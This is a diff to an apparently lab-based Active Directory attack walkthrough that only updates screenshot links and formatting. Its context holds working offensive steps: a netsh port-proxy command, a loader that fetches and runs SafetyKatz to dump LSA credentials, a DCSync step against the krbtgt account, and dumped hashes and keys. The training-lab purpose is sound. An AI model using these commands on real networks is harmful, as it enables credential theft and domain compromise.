@@ -108,7 +108,7 @@ Cached Tickets: (0)
   ASREP (key)              :  6366243A657A4EA04E406F1ABC27F1ADA358CCD0138EC5CA2835067719DC7011
 ```
 
-![New spawned terminal process](./assets/screenshots/learning_objectives_new_spawned_terminal_process.png)
+![New spawned terminal process](./assets/screenshots/learning_objective_08_new_spawned_terminal_process.png)
 
 ![Victim: dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -203,7 +203,7 @@ Mandatory Label\High Mandatory Level         Label            S-1-16-12288
 
 `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`
 
-![HFS - SafetyKatz.exe]()
+![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_safetykatz.png)
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
 ```
@@ -248,7 +248,7 @@ NTLM : 68d6c096c7cfee52a45d6207489526bc
 [SNIP]
 ```
 
-To get NTLM hash and AES keys of the `krbtgt` account, we can use the DCSync attack. Run the below command from process running as domain admin on the student VM.
+To get NTLM hash and AES keys of the `krbtgt` account, we can use the DCSync attack. Run the below command **from process running as domain admin on the student VM**.
 
 `exit`
 
